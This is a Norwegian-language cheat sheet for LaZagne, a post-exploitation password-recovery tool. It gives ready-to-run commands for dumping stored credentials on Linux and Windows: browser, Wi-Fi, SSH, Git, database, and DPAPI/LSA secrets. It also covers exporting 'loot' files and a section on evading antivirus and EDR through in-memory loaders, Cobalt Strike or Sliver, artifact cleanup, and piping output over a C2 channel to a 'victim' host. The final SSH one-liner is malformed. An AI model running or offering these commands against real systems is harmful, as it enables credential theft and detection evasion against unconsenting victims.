<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# LaZagne Jukseark

[LaZagne](https://github.com/AlessandroZ/LaZagne) er en åpen kildekode-applikasjon etter utnyttelse som brukes til å hente passord som er lagret på en lokal datamaskin. Den støtter Windows, Linux og macOS på tvers av flere kategorier, inkludert nettlesere, e-postklienter, Wi-Fi-nettverk, programvare for databaseadministrasjon, sysadmin-verktøy og minnebuffere.

---

## Innholdsfortegnelse

- [Støttede moduler og kategorier](#støttede-moduler--kategorier)
- [Installasjon og binære filer](#installasjon--binære filer)
- [Linux Credential Harvesting](#linux-credential-harvesting)
- [Windows Credential Harvesting](#windows-credential-harvesting)
- [målrettede kategoriangrep](#målrettede kategoriangrep)
- [Utdataformater og fileksport](#output-formats--file-export)
– [Operational Security & EDR Avoidance](#operational-security--edr-avoidance)

---

## Støttede moduler og kategorier

LaZagne trekker ut legitimasjon fra dusinvis av applikasjoner gruppert i kategorier:
- **Nettlesere:** Chrome, Firefox, Edge, Opera, Brave, Chromium (historikk, autofyll, informasjonskapsler, legitimasjon).
- **Sysadmin-verktøy:** WinSCP, PuTTY, OpenSSH (`id_rsa`-nøkler / config), RDP / mstsc, FileZilla, Cyberduck, VNC.
- **Databaser:** DBeaver, pgAdmin, Squirrel, Robomongo, SQL Server Management Studio.
- **Wi-Fi:** Lagrede WPA2/WPA3 forhåndsdelte nøkler (PSK) i OS-nettverksprofiler.
- **Utvikler og VCS:** Git-legitimasjon (`.git-credentials`, cache), SVN, Docker-tokens, AWS CLI-legitimasjon.
- **E-post og chat:** Thunderbird, Outlook, Pidgin, Skype.
- **Windows Vault & DPAPI:** LSA-hemmeligheter, DPAPI-hovednøkler, Credential Manager-hvelvelementer.

---

## Installasjon og binære filer
```bash
# Clone the repository
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne

# Install Python dependencies (for running source on Linux)
pip install -r requirements.txt

# Or download pre-compiled standalone binaries (releases page)
# Windows: lazagne.exe
# Linux: laZagne.py
```
---

## Linux Credential Harvesting

### 1. Kjør alle ekstraksjonsmoduler
```bash
python3 laZagne.py all
```
### 2. Kjør med root / Sudo-privilegier (utvider tilgang til skygge og nøkkelring)
Å kjøre som `root` låser opp systemhemmeligheter, Wi-Fi-profiler i `/etc/NetworkManager` og SSH-nøkler på tvers av alle `/home/*`-kataloger:
```bash
sudo python3 laZagne.py all
```
### 3. Trekk ut passord fra Gnome Keyring / KWallet
```bash
python3 laZagne.py sysadmin -k
```
---

## Windows Credential Harvesting

På Windows bruker du den frittstående kjørbare `lazagne.exe`:

### 1. Pakk ut alle lagrede passord
```cmd
lazagne.exe all
```
### 2. Kjør med forhøyede rettigheter (admin / SYSTEM)
Trekk ut DPAPI-hovednøkler, LSA-hemmeligheter og bufret domenelegitimasjon:
```cmd
lazagne.exe all -v
```
### 3. Trekk ut passord for en spesifikk bruker (når du kjører som administrator)
```cmd
lazagne.exe all -path "C:\Users\TargetUser\AppData"
```
---

## Målrettede kategoriangrep

I stedet for å kjøre alle moduler, spesifiser målprogramvarekategorier for å minimere diskaktivitet og støy:

### 1. Bare nettlesere
```bash
# Linux
python3 laZagne.py browsers

# Windows
lazagne.exe browsers
```
### 2. Wi-Fi klartekst-passord
```bash
# Linux (requires root or sudo)
sudo python3 laZagne.py wifi

# Windows
lazagne.exe wifi
```
### 3. Sysadmin og fjerntilgangsverktøy (SSH, RDP, WinSCP, FileZilla)
```bash
# Linux
python3 laZagne.py sysadmin

# Windows
lazagne.exe sysadmin
```
### 4. Databaseklienter
```bash
# Linux
python3 laZagne.py databases

# Windows
lazagne.exe databases
```
### 5. Utvikler- og Git-legitimasjon
```bash
# Linux
python3 laZagne.py git
```
---

## Utdataformater og fileksport

Lagre innhentet legitimasjon direkte på disk i strukturerte formater:

### Eksporter til JSON-format
```bash
python3 laZagne.py all -oJ -oN /tmp/loot_credentials
```
Oppretter `/tmp/loot_credentials.json` som inneholder strukturert legitimasjon, URL-er, brukernavn og klartekstpassord.

### Eksporter til ren tekst
```bash
python3 laZagne.py all -oT -oN /tmp/loot_credentials
```
Oppretter `/tmp/loot_credentials.txt`.

---

## Driftssikkerhet og EDR-unngåelse

- **Antivirusdeteksjon:** Frittstående `lazagne.exe` er sterkt signert av Windows Defender og kommersielle EDR-løsninger.
- **Obfuskering og kjøring i minnet:**
  - Utfør via PowerShell-refleksjon eller in-memory-lastere (`donut`, `execute-assembly` i Cobalt Strike / Sliver).
  - Bruk Python-kildeversjonen med et tilpasset virtuelt miljø i stedet for den pakkede PyInstaller-binæren.
- **Ren artefakter:** Slett midlertidige loot-filer eller omdiriger utdata direkte gjennom standard ut over en kryptert C2-beacon eller SSH-økt:
  ```bash
  ssh victim@192.168.1.50 'python3 -' < laZagne.py all
  ```